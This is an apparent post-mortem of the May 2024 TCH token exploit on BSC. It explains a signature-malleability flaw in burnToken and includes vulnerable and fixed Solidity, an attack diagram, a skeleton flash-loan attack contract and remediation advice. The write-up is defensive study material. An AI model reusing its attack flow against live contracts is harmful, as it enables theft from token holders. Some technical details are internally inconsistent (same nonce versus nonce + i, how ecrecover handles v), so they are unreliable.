# TCH — burnToken Signature Malleability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | TCH |
| **Chain** | BSC |
| **Loss** | ~$18,000 |
| **Attacker** | [0xb9596d6e](https://bscscan.com/address/0xb9596d6e53d81981b9f06ca2ca6d3e422232d575) |
| **Attack Contract** | [0x258850ec](https://bscscan.com/address/0x258850ec735f6532fe34fe24ef9628992a9b7e84) |
| **Vulnerable Contract** | [TCH 0x5d78CFc8](https://bscscan.com/address/0x5d78CFc8732fd328015C9B73699dE9556EF06E8E) |
| **Root Cause** | The `burnToken(uint256 amount, uint256 nonce, bytes memory signature)` function accepts manipulated signatures as valid even when the last byte (`v` value) is altered from `0x1c`→`0x01` or `0x1b`→`0x00` — a signature malleability vulnerability. Called 34 times to mass-burn TCH → price distortion followed by profit-taking |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TCH_exp.sol) |

---

## 1. Vulnerability Overview

TCH's `burnToken()` function authorizes burns via signature verification, but does not normalize the `v` value (last byte) of the signature before calling `ecrecover`. In ECDSA signatures, `v = 0x1c` and `v = 0x01` can be treated as the same valid signature (signature malleability). The attacker manipulated the `v` byte of a legitimate signature to call `burnToken()` 34 times with the same nonce, causing a sharp drop in TCH supply that distorted the price, which was then exploited in combination with a flash loan for profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: ecrecover without v value normalization
contract TCHToken {
    mapping(uint256 => bool) public usedNonces;

    function burnToken(uint256 amount, uint256 nonce, bytes memory signature) external {
        // No protection against duplicate nonce usage (or bypassed via tampered signature)
        bytes32 msgHash = keccak256(abi.encodePacked(msg.sender, amount, nonce));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));

        // No v value normalization
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);
        // v = 0x00 or 0x01 may also be accepted as valid inside ecrecover
        address signer = ecrecover(ethHash, v, r, s);
        require(signer == authorizedSigner, "invalid signature");

        // No nonce reuse protection → repeated calls possible with tampered signature
        _burn(msg.sender, amount);
    }
}

// ✅ Safe code: Use OpenZeppelin ECDSA + nonce tracking
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

function burnToken(uint256 amount, uint256 nonce, bytes memory signature) external {
    require(!usedNonces[nonce], "nonce already used");
    usedNonces[nonce] = true;

    bytes32 msgHash = keccak256(abi.encodePacked(msg.sender, amount, nonce));
    // OpenZeppelin ECDSA: v normalization + signature malleability prevention
    address signer = ECDSA.recover(ECDSA.toEthSignedMessageHash(msgHash), signature);
    require(signer == authorizedSigner, "invalid signature");
    _burn(msg.sender, amount);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: TCH_decompiled.sol
contract TCH {
    function burnToken(uint256 p0, uint256 p1, bytes memory p2) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] V3 Flash Loan: 2,500,000 BUSDT
  │
  ├─→ [2] Swap BUSDT → TCH
  │
  ├─→ [3] Tamper the v byte of a legitimate signature (0x1c → 0x01, etc.)
  │
  ├─→ [4] burnToken(amount, nonce, tamperedSig) × 34 calls
  │         └─ Accepted as valid due to signature malleability
  │         └─ TCH burned on every call → supply collapses
  │
  ├─→ [5] TCH price spikes (reduced supply)
  │
  ├─→ [6] Swap TCH → BUSDT (at elevated price)
  │
  ├─→ [7] Repay V3 flash loan
  │
  └─→ [8] ~$18K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ITCHToken {
    function burnToken(uint256 amount, uint256 nonce, bytes memory signature) external;
}

contract AttackContract {
    ITCHToken constant tch  = ITCHToken(0x5d78CFc8732fd328015C9B73699dE9556EF06E8E);
    IERC20    constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    // Original signature (obtained via a legitimate path)
    bytes originalSig;

    function testExploit() external {
        // [1] Flash loan 2.5M BUSDT
        flashLoan(2_500_000e18);
    }

    function flashCallback() external {
        // [2] Swap BUSDT → TCH
        swapBUSDTToTCH(2_500_000e18);

        // [3] Call burnToken 34 times with tampered v byte signatures
        for (uint i = 0; i < 34; i++) {
            // Tamper the last byte of signature: 0x1c → 0x01 or 0x1b → 0x00
            bytes memory tamperedSig = tamperSignature(originalSig, i);
            tch.burnToken(burnAmount, nonce + i, tamperedSig);
            // Accepted as valid due to signature malleability → TCH burned
        }

        // [4] Swap TCH → BUSDT (price rose due to reduced supply)
        swapTCHToBUSDT(TCH.balanceOf(address(this)));

        // [5] Repay flash loan
        BUSDT.transfer(lender, flashAmount + fee);
    }

    function tamperSignature(bytes memory sig, uint256 i) internal pure returns (bytes memory) {
        bytes memory tampered = sig;
        // Toggle the v byte (last byte): 0x1c ↔ 0x01
        if (tampered[64] == 0x1c) tampered[64] = 0x01;
        else if (tampered[64] == 0x1b) tampered[64] = 0x00;
        return tampered;
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | ECDSA Signature Malleability |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **Attack Vector** | External (tampered signature + repeated burnToken calls) |
| **DApp Category** | Token with signature-based burn mechanism |
| **Impact** | TCH supply manipulation → price distortion → BUSDT theft (~$18K) |

## 6. Remediation Recommendations

1. **Use OpenZeppelin ECDSA**: `ECDSA.recover()` automatically prevents signature malleability
2. **Nonce tracking**: Record used nonces via `mapping(uint256 => bool)` to prevent reuse
3. **v value normalization**: If `v < 27`, apply `v += 27`
4. **EIP-712 structured signing**: Migrate to the standard signing scheme

## 7. Lessons Learned

- When using raw `ecrecover`, ECDSA signature malleability always requires both v value normalization and nonce tracking.
- OpenZeppelin's `ECDSA.recover()` automatically prevents signature malleability and should always be used for signature verification.
- Signature-based burn mechanisms must simultaneously guard against both nonce reuse and signature malleability.